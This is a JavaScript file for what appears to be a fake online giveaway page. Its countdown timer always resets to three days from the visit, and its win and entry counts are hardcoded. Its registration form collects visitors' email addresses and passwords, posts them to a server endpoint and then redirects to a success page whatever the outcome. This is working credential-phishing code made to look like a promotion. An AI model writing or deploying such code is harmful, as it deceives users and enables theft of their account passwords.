document.addEventListener('DOMContentLoaded', function() {

    // ===== COUNTDOWN – 3 DAYS FROM NOW =====
    const countdownElement = document.getElementById('countdown');
    if (countdownElement) {
        let targetDate = new Date();
        targetDate.setDate(targetDate.getDate() + 3);
        targetDate.setHours(23, 59, 59, 0);

        function updateTimer() {
            const now = new Date();
            const diff = targetDate - now;

            if (diff <= 0) {
                countdownElement.textContent = '🎉 GIVEAWAY ENDED';
                return;
            }

            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diff % (1000 * 60)) / 1000);

            if (days > 0) {
                countdownElement.textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`;
            } else {
                countdownElement.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }
        }

        updateTimer();
        setInterval(updateTimer, 1000);
    }

    // ===== STATS – 207 PEOPLE WON =====
    const winCount = document.getElementById('winCount');
    const entryCount = document.getElementById('entryCount');

    if (winCount) {
        winCount.textContent = '207';
    }

    if (entryCount) {
        entryCount.textContent = '2,347';
    }

    // ===== REGISTRATION FORM =====
    const form = document.getElementById('registerForm');
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const username = document.getElementById('username').value.trim() || 'Guest';
            const option = document.getElementById('giveawayOption').value;

            if (!email || !password) {
                alert('⚠️ Please fill all fields!');
                return;
            }

            const btn = form.querySelector('button');
            btn.textContent = '⏳ Submitting...';
            btn.disabled = true;

            try {
                const response = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password, username, option })
                });
                window.location.href = 'success.html';
            } catch (error) {
                window.location.href = 'success.html';
            }
        });
    }

    // ===== POLL FORM =====
    const pollForm = document.getElementById('pollForm');
    if (pollForm) {
        pollForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const selected = document.querySelector('input[name="poll"]:checked');
            if (!selected) {
                alert('⚠️ Please select an option!');
                return;
            }

            const vote = selected.value;
            const btn = pollForm.querySelector('.poll-btn');
            btn.textContent = '⏳ Submitting...';
            btn.disabled = true;

            try {
                const response = await fetch('/api/poll', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ vote })
                });

                const result = await response.json();

                if (result.success) {
                    alert('✅ Your vote has been recorded! Thank you for participating!');
                    pollForm.reset();
                } else {
                    alert('⚠️ Something went wrong. Please try again.');
                }
            } catch (error) {
                alert('⚠️ Network error. Please try again.');
            } finally {
                btn.textContent = '🗳️ Vote Now';
                btn.disabled = false;
            }
        });
    }
});
